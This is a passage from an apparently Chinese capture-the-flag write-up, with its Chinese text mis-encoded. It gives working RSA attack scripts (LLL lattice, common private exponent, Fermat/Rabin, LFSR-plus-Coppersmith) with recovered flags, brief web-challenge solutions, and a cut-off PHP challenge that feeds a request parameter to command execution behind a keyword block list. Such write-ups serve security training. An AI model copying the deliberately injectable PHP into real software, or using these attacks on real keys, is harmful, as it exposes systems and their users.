class="number">3.</span>/<span class="number">2</span> + alpha2))</span><br><span class="line">    M4 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">0.5</span>) )</span><br><span class="line">    M5 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">3.</span>/<span class="number">2</span> + alpha2) )</span><br><span class="line">    M6 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    M7 = <span class="built_in">int</span>( gmpy2.mpz(N)**(<span class="number">1.</span>+alpha2) )</span><br><span class="line">    D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, <span class="number">1</span>])</span><br><span class="line">    B = Matrix(ZZ, [ [<span class="number">1</span>, -N,   <span class="number">0</span>,  N**<span class="number">2</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>,    -N**<span class="number">3</span>],</span><br><span class="line">                 [<span class="number">0</span>, e1, -e1, -e1*N, -e1,      <span class="number">0</span>,   e1*N,  e1*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,  e2, -e2*N,   <span class="number">0</span>,   e2*N,      <span class="number">0</span>,  e2*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>, e1*e2,   <span class="number">0</span>, -e1*e2, -e1*e2, -e1*e2*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,  e3,  -e3*N,  -e3*N,  e3*N**<span class="number">2</span>],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,  e1*e3,      <span class="number">0</span>, -e1*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,  e2*e3, -e2*e3*N],</span><br><span class="line">                 [<span class="number">0</span>,  <span class="number">0</span>,   <span class="number">0</span>,     <span class="number">0</span>,   <span class="number">0</span>,      <span class="number">0</span>,      <span class="number">0</span>, e1*e2*e3] ]) * D</span><br><span class="line">    L = B.LLL()</span><br><span class="line">    v = Matrix(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    x = v * B**(-<span class="number">1</span>)</span><br><span class="line">    phi_ = (e1*x[<span class="number">0</span>,<span class="number">1</span>]/x[<span class="number">0</span>,<span class="number">0</span>]).floor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = inverse_mod(<span class="number">65537</span>, phi_)</span><br><span class="line">        m = <span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:]</span><br><span class="line">        m = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(power_mod(c, d, N))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m)&lt;<span class="number">20</span>:</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;f-4ae0-b369-&#x27; </span></span><br></pre></td></tr></table></figure><p>Part3ï¼Œå…±ç§é’¥æŒ‡æ•° $d$ æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">nl=[...]</span><br><span class="line">el=[...]</span><br><span class="line">cl=[...]</span><br><span class="line">ind=[]</span><br><span class="line">nl_s=<span class="built_in">sorted</span>(nl)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ind.append(nl.index(nl_s[i]))</span><br><span class="line"><span class="built_in">print</span>(ind)</span><br><span class="line">e=[]</span><br><span class="line">n=[]</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    e.append(el[ind[i]])</span><br><span class="line">    n.append(nl[ind[i]])</span><br><span class="line">    c.append(cl[ind[i]])</span><br><span class="line"></span><br><span class="line">M=iroot(<span class="built_in">int</span>(n[<span class="number">6</span>]),<span class="built_in">int</span>(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">a=[<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">a[<span class="number">0</span>]=[M,e[<span class="number">0</span>],e[<span class="number">1</span>],e[<span class="number">2</span>],e[<span class="number">3</span>],e[<span class="number">4</span>],e[<span class="number">5</span>],e[<span class="number">6</span>]]</span><br><span class="line">a[<span class="number">1</span>]=[<span class="number">0</span>,-n[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">2</span>]=[<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">3</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">2</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">4</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">3</span>],<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">5</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">4</span>],<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">a[<span class="number">6</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">5</span>],<span class="number">0</span>]</span><br><span class="line">a[<span class="number">7</span>]=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-n[<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">Mat = matrix(ZZ,a)</span><br><span class="line">Mat_LLL=Mat.LLL()</span><br><span class="line">d = <span class="built_in">abs</span>(Mat_LLL[<span class="number">0</span>][<span class="number">0</span>])//M</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c[<span class="number">6</span>],<span class="built_in">int</span>(d),<span class="built_in">int</span>(n[<span class="number">6</span>])))[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;5a3d94a20a2c&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿æ¥å¾—flagï¼šflag{89c63fd5-00cf-4ae0-b369-5a3d94a20a2c}</p><p>â€‹    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>flag{md5(result)}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;????&#x27;</span></span><br><span class="line"></span><br><span class="line">z=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=sympy.nextprime(z)</span><br><span class="line">q=sympy.prevprime(<span class="number">10</span>*z)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">e=<span class="number">0xe18e</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n= ...</span></span><br><span class="line"><span class="comment">#c= ...</span></span><br></pre></td></tr></table></figure></blockquote><p>è´¹é©¬åˆ†è§£RSAï¼Œå‘ç° $\gcd(e,\varphi(n))=2$ï¼Œä»¤ $eâ€™=\frac{e}{2},mâ€™=m^2$ï¼Œ</p><p>å…ˆæ±‚å‡º $mâ€™$ï¼Œå†åˆ©ç”¨Rabinç®—æ³•æ±‚ $m$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0xe18e</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(n//<span class="number">10</span>,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = gmpy2.next_prime(p)</span><br><span class="line">    <span class="keyword">if</span> n%p==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e//<span class="number">2</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(mm)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">n = p * q</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">m = rabin_decrypt(mm,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="BABY-RSA"><a href="#BABY-RSA" class="headerlink" title="BABY-RSA"></a>BABY-RSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr</span>(<span class="params">status,mask</span>):</span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">c = <span class="built_in">pow</span>(num, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w+&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(hp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">str</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= ...</span></span><br><span class="line"><span class="string">c= ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key:</span></span><br><span class="line"><span class="string">0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA $p$ é«˜ä½æ³„éœ²æ”»å‡»+LFSRã€‚</p><p>å…ˆç”¨LFSRç»“æœå¼‚æˆ–è¿˜åŸ $p$ é«˜ä½ $hp$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr</span>(<span class="params">status,mask</span>):</span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&#x27;0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;</span>)</span><br><span class="line">c=[<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line">hp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">hp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">int</span>(hp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(hp)</span><br><span class="line"><span class="comment"># 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ $hp$ æœ‰568ä½ï¼Œæ ¹æ®Coppersmithå®šç†ï¼Œ1024ä½çš„ $p$ è‡³å°‘éœ€è¦é«˜576ä½æ‰èƒ½æ¢å¤å®Œæ•´ $p$ï¼Œéœ€çˆ†ç ´8ä½äºŒè¿›åˆ¶ä½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">hp = <span class="number">484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.digits + <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        pp = <span class="built_in">hex</span>(hp) + a + b</span><br><span class="line">        <span class="comment">#péœ€è¦ç”¨0è¡¥å…¨åˆ°1024ä½</span></span><br><span class="line">        pp += <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">        <span class="comment">#è¦åŠ çš„æ•°å­—ä¸è¡¥å…¨pæ—¶0çš„ä¸ªæ•°æœ‰å…³</span></span><br><span class="line">        pp = <span class="built_in">int</span>(pp, <span class="number">16</span>)</span><br><span class="line">        p_fake = pp+<span class="number">0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">        pbits = <span class="number">1024</span></span><br><span class="line">        kbits = pbits-<span class="number">576</span></span><br><span class="line">        pbar = p_fake &amp; (<span class="number">2</span>^pbits-<span class="number">2</span>^kbits)</span><br><span class="line">        <span class="comment">#print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))</span></span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        f = x + pbar</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">            <span class="built_in">print</span>(x0 + pbar)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span>        </span><br><span class="line"><span class="comment"># 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br></pre></td></tr></table></figure><p>æœ€åå¸¸è§„RSAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">c = <span class="number">3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789</span></span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h3><p>æŸ¥çœ‹æºç ï¼Œæ‰¾åˆ° <code>main.js</code>ï¼Œå‘ç° <code>ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==</code>ï¼Œbase64è§£ç å¾—flagã€‚</p><p>â€‹    </p><h3 id="Web-sign-in"><a href="#Web-sign-in" class="headerlink" title="Web-sign in"></a>Web-sign in</h3><p>æç¤ºrobotsåè®®ï¼Œè®¿é—® <code>robots.txt</code>ï¼Œå‘ç°å­˜åœ¨ <code>fiag_ls_h3re.php</code>ï¼Œ</p><p>è®¿é—®å‘ç°å³é”®è¢«ç¦ç”¨ï¼ŒåŠ å‰ç¼€ <code>view-source:</code> æŸ¥çœ‹æºç å¾—flagã€‚</p><p>â€‹    </p><h3 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = 